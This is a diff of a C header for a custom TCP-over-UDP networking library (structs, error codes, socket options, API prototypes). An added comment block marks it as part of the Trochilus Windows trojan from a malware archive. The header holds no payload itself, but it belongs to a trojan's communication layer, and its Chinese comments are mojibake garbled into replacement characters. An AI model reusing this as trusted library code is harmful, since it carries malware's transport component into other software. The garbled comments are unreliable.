@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 
 #ifndef VTCP_H
 #define VTCP_H
@@ -67,41 +78,41 @@ typedef struct SVTcpFdSet
 }S_VTCP_FD_SET,*PS_VTCP_FD_SET;
 
 
-typedef struct SVTcpStatCount					//×´Ì¬Í³¼ÆÐÅÏ¢
+typedef struct SVTcpStatCount					//×´Ì¬Í³ï¿½ï¿½ï¿½ï¿½Ï¢
 {	
-	int sizeOfStruct;							//½á¹¹´óÐ¡
+	int sizeOfStruct;							//ï¿½á¹¹ï¿½ï¿½Ð¡
 
-	unsigned long version;						//°æ±¾
+	unsigned long version;						//ï¿½æ±¾
 	
-	unsigned long time;							//Ê±¼ä¼ä¸ô
+	unsigned long time;							//Ê±ï¿½ï¿½ï¿½ï¿½
 	
-	int64	count_recv_bytes;					//½ÓÊÕ×Ü×Ö½Ú
-	int64	count_recv_bytes_cur;				//½ÓÊÕ×Ü×Ö½Ú£¨µ±Ç°ËÙ¶È£©
-	int64	count_send_bytes;					//·¢ËÍ×Ü×Ö½Ú
-	int64	count_send_bytes_cur;				//·¢ËÍ×Ü×Ö½Ú£¨µ±Ç°ËÙ¶È£©
+	int64	count_recv_bytes;					//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö½ï¿½
+	int64	count_recv_bytes_cur;				//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö½Ú£ï¿½ï¿½ï¿½Ç°ï¿½Ù¶È£ï¿½
+	int64	count_send_bytes;					//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö½ï¿½
+	int64	count_send_bytes_cur;				//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö½Ú£ï¿½ï¿½ï¿½Ç°ï¿½Ù¶È£ï¿½
 
-	int64	count_do_send_data_rep;				//·¢³öÊý¾ÝÁ÷°üÖØ¸´¸öÊý
-	int64	count_do_send_data;					//·¢³öÊý¾ÝÁ÷°ü¸öÊý
-	int64	count_do_send_data_ack;				//·¢³öÊý¾ÝÁ÷°üÓ¦´ð¸öÊý
-	int64	count_do_send_sync;					//·¢³öÍ¬²½°ü¸öÊý
-	int64	count_do_send_sync_ack;				//·¢³öÍ¬²½°üÓ¦´ð¸öÊý
+	int64	count_do_send_data_rep;				//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ø¸ï¿½ï¿½ï¿½ï¿½ï¿½
+	int64	count_do_send_data;					//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+	int64	count_do_send_data_ack;				//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ó¦ï¿½ï¿½ï¿½ï¿½ï¿½
+	int64	count_do_send_sync;					//ï¿½ï¿½ï¿½ï¿½Í¬ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+	int64	count_do_send_sync_ack;				//ï¿½ï¿½ï¿½ï¿½Í¬ï¿½ï¿½ï¿½ï¿½Ó¦ï¿½ï¿½ï¿½ï¿½ï¿½
 
-	int64	count_on_recv_data_rep;				//ÊÕµ½Êý¾ÝÁ÷°üÖØ¸´¸öÊý
-	int64	count_on_recv_data;					//ÊÕµ½Êý¾ÝÁ÷°ü¸öÊý
-	int64	count_on_recv_data_ack;				//ÊÕµ½Êý¾ÝÁ÷°üÓ¦´ð¸öÊý
-	int64	count_on_recv_sync;					//ÊÕµ½Í¬²½°ü¸öÊý
-	int64	count_on_recv_sync_ack;				//ÊÕµ½Í¬²½°üÓ¦´ð¸öÊý
+	int64	count_on_recv_data_rep;				//ï¿½Õµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ø¸ï¿½ï¿½ï¿½ï¿½ï¿½
+	int64	count_on_recv_data;					//ï¿½Õµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+	int64	count_on_recv_data_ack;				//ï¿½Õµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ó¦ï¿½ï¿½ï¿½ï¿½ï¿½
+	int64	count_on_recv_sync;					//ï¿½Õµï¿½Í¬ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+	int64	count_on_recv_sync_ack;				//ï¿½Õµï¿½Í¬ï¿½ï¿½ï¿½ï¿½Ó¦ï¿½ï¿½ï¿½ï¿½ï¿½
 
-	int		tcp_rtt;							//Íù·µÖÜÆÚ
-	int		tcp_cwnd;							//·¢ËÍ´°¿Ú
-	int		tcp_cwnd_ssthresh;					//·¢ËÍ´°¿Ú·§Öµ
+	int		tcp_rtt;							//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+	int		tcp_cwnd;							//ï¿½ï¿½ï¿½Í´ï¿½ï¿½ï¿½
+	int		tcp_cwnd_ssthresh;					//ï¿½ï¿½ï¿½Í´ï¿½ï¿½Ú·ï¿½Öµ
 
-	int		count_async_opt;					//Ó¦ÓÃ²ãÒì²½¶ÓÁÐ¸öÊý
-	int		count_pm_r;							//ÄÚºË°ü½ÓÊÕ¶ÓÁÐ
-	int		count_pm_s;							//ÄÚºË°ü·¢ËÍ¶ÓÁÐ
+	int		count_async_opt;					//Ó¦ï¿½Ã²ï¿½ï¿½ì²½ï¿½ï¿½ï¿½Ð¸ï¿½ï¿½ï¿½
+	int		count_pm_r;							//ï¿½ÚºË°ï¿½ï¿½ï¿½ï¿½Õ¶ï¿½ï¿½ï¿½
+	int		count_pm_s;							//ï¿½ÚºË°ï¿½ï¿½ï¿½ï¿½Í¶ï¿½ï¿½ï¿½
 
-	unsigned char grap_r[128];					//°ü·¢ËÍ×´Ì¬Î»Í¼
-	unsigned char grap_s[128];					//°ü½ÓÊÕ×´Ì¬Î»Í¼
+	unsigned char grap_r[128];					//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½×´Ì¬Î»Í¼
+	unsigned char grap_s[128];					//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½×´Ì¬Î»Í¼
 
 
 }S_VTCP_STAT_COUNT,*PS_VTCP_STAT_COUNT;
@@ -109,43 +120,43 @@ typedef struct SVTcpStatCount					//×´Ì¬Í³¼ÆÐÅÏ¢
 
 enum EVTcpErrorCode
 {
-	VTCP_ERROR_NOT_ENOUGH_MEMORY		= 1,	//ÄÚ´æ²»×ã
-	VTCP_ERROR_INVALID_PARAMETER		= 2,	//²ÎÊý´íÎó
-	VTCP_ERROR_INVALID_STATE			= 3,	//¾ä±ú×´Ì¬´íÎó
-	VTCP_ERROR_INVALID_SOCKET			= 4,	//¾ä±ú´íÎó
-	VTCP_ERROR_TIMEOUT					= 5,	//²Ù×÷³¬Ê±
-	VTCP_ERROR_WOULDBLOCK				= 7,	//Òì²½×èµ²
-	VTCP_ERROR_CONNRESET				= 8,	//Ô¶³Ì¹Ø±ÕÁËÁ¬½Ó
-	VTCP_ERROR_CONNABORTED				= 9,	//±¾µØ¹Ø±ÕÁËÁ¬½Ó
-	VTCP_ERROR_CONNREFUSED				= 10,	//Á¬½Ó±»»ý¼«¾Ü¾ø
-	VTCP_ERROR_MSG_SIZE					= 11,	//ÏûÏ¢³ß´ç´íÎó
-	VTCP_ERROR_CANCELLED				= 12,	//²Ù×÷±»È¡Ïû
-	VTCP_ERROR_NOT_FOUND				= 13,	//¶ÔÏóÎ´·¢ÏÖ
-	VTCP_ERROR_BUSY						= 14,	//ÏµÍ³·±Ã¦
-	VTCP_ERROR_SYSTEM_FAIL				= 15,	//ÏµÍ³µ÷ÓÃÊ§°Ü
-	VTCP_ERROR_NETRESET					= 16,	//Òò±£»î¼ì²âÊ§°Ü¶ø¶ÏÏß
+	VTCP_ERROR_NOT_ENOUGH_MEMORY		= 1,	//ï¿½Ú´æ²»ï¿½ï¿½
+	VTCP_ERROR_INVALID_PARAMETER		= 2,	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+	VTCP_ERROR_INVALID_STATE			= 3,	//ï¿½ï¿½ï¿½×´Ì¬ï¿½ï¿½ï¿½ï¿½
+	VTCP_ERROR_INVALID_SOCKET			= 4,	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+	VTCP_ERROR_TIMEOUT					= 5,	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê±
+	VTCP_ERROR_WOULDBLOCK				= 7,	//ï¿½ì²½ï¿½èµ²
+	VTCP_ERROR_CONNRESET				= 8,	//Ô¶ï¿½Ì¹Ø±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+	VTCP_ERROR_CONNABORTED				= 9,	//ï¿½ï¿½ï¿½Ø¹Ø±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+	VTCP_ERROR_CONNREFUSED				= 10,	//ï¿½ï¿½ï¿½Ó±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ü¾ï¿½
+	VTCP_ERROR_MSG_SIZE					= 11,	//ï¿½ï¿½Ï¢ï¿½ß´ï¿½ï¿½ï¿½ï¿½
+	VTCP_ERROR_CANCELLED				= 12,	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¡ï¿½ï¿½
+	VTCP_ERROR_NOT_FOUND				= 13,	//ï¿½ï¿½ï¿½ï¿½Î´ï¿½ï¿½ï¿½ï¿½
+	VTCP_ERROR_BUSY						= 14,	//ÏµÍ³ï¿½ï¿½Ã¦
+	VTCP_ERROR_SYSTEM_FAIL				= 15,	//ÏµÍ³ï¿½ï¿½ï¿½ï¿½Ê§ï¿½ï¿½
+	VTCP_ERROR_NETRESET					= 16,	//ï¿½ò±£»ï¿½ï¿½ï¿½Ê§ï¿½Ü¶ï¿½ï¿½ï¿½ï¿½ï¿½
 
 };
 
 enum EVTcpSoOpt
 {
-	VTCP_SO_CONNECT_TIMEO				= 1,	//Á¬½Ó³¬Ê±(unsigned long)(ºÁÃë£©
-	VTCP_SO_RECV_TIMEO					= 2,	//½ÓÊÕ³¬Ê±(unsigned long)(ºÁÃë£©
-	VTCP_SO_RECVFROM_TIMEO				= 3,	//½ÓÊÕ³¬Ê±(unsigned long)(ºÁÃë£©
-	VTCP_SO_SEND_TIMEO					= 4,	//·¢ËÍ³¬Ê±(unsigned long)(ºÁÃë£©
-	VTCP_SO_SENDTO_TIMEO				= 5,	//·¢ËÍ³¬Ê±(unsigned long)(ºÁÃë£©
-	VTCP_SO_LINGER						= 6,	//¶ºÁôÊ±¼ä(SVTcpLinger)
-	VTCP_SO_KEEPALIVE					= 7,	//±£»îÉèÖÃ(SVTcpKeepAlive)
-	VTCP_SO_RSVP						= 8,	//×ÊÔ´Ô¤Áô(SVTcpRSVP)(ÊÓÆµ´«Êä)
-	VTCP_SO_STAT_COUNT					= 9,	//Í³¼ÆÐÅÏ¢(SVTcpStatCount)
-	VTCP_SO_LOSS_PERCENT				= 10,	//¶ª°üÈÝÈÌ(int)(°Ù·Ö±È)(0~100)
+	VTCP_SO_CONNECT_TIMEO				= 1,	//ï¿½ï¿½ï¿½Ó³ï¿½Ê±(unsigned long)(ï¿½ï¿½ï¿½ë£©
+	VTCP_SO_RECV_TIMEO					= 2,	//ï¿½ï¿½ï¿½Õ³ï¿½Ê±(unsigned long)(ï¿½ï¿½ï¿½ë£©
+	VTCP_SO_RECVFROM_TIMEO				= 3,	//ï¿½ï¿½ï¿½Õ³ï¿½Ê±(unsigned long)(ï¿½ï¿½ï¿½ë£©
+	VTCP_SO_SEND_TIMEO					= 4,	//ï¿½ï¿½ï¿½Í³ï¿½Ê±(unsigned long)(ï¿½ï¿½ï¿½ë£©
+	VTCP_SO_SENDTO_TIMEO				= 5,	//ï¿½ï¿½ï¿½Í³ï¿½Ê±(unsigned long)(ï¿½ï¿½ï¿½ë£©
+	VTCP_SO_LINGER						= 6,	//ï¿½ï¿½ï¿½ï¿½Ê±ï¿½ï¿½(SVTcpLinger)
+	VTCP_SO_KEEPALIVE					= 7,	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½(SVTcpKeepAlive)
+	VTCP_SO_RSVP						= 8,	//ï¿½ï¿½Ô´Ô¤ï¿½ï¿½(SVTcpRSVP)(ï¿½ï¿½Æµï¿½ï¿½ï¿½ï¿½)
+	VTCP_SO_STAT_COUNT					= 9,	//Í³ï¿½ï¿½ï¿½ï¿½Ï¢(SVTcpStatCount)
+	VTCP_SO_LOSS_PERCENT				= 10,	//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½(int)(ï¿½Ù·Ö±ï¿½)(0~100)
 
 };
 
 enum EVTcpQIOEvent
 {
-	VTCP_QIO_EVENT_ACCEPT		= 1, //¼æÈÝVTCP_QIO_EVENT_RECV
-	VTCP_QIO_EVENT_CONNECT		= 2, //¼æÈÝVTCP_QIO_EVENT_SEND
+	VTCP_QIO_EVENT_ACCEPT		= 1, //ï¿½ï¿½ï¿½ï¿½VTCP_QIO_EVENT_RECV
+	VTCP_QIO_EVENT_CONNECT		= 2, //ï¿½ï¿½ï¿½ï¿½VTCP_QIO_EVENT_SEND
 	VTCP_QIO_EVENT_RECV			= 3,
 	VTCP_QIO_EVENT_RECVFROM		= 4,
 	VTCP_QIO_EVENT_SEND			= 5,
@@ -170,7 +181,7 @@ enum EVTcpCtl
 #define VTCP_EXPORT_API(t) extern "C" t
 #endif
 
-//APIÊ¹ÓÃ°ïÖú WWW.VTCP123.COM  
+//APIÊ¹ï¿½Ã°ï¿½ï¿½ï¿½ WWW.VTCP123.COM  
 
 VTCP_EXPORT_API(VTCP_SOCKET		)vtcp_accept		(VTCP_SOCKET s, sockaddr * sai, socklen_t * sailen);
 VTCP_EXPORT_API(int				)vtcp_bind			(VTCP_SOCKET s, const struct sockaddr * sai, socklen_t sailen);
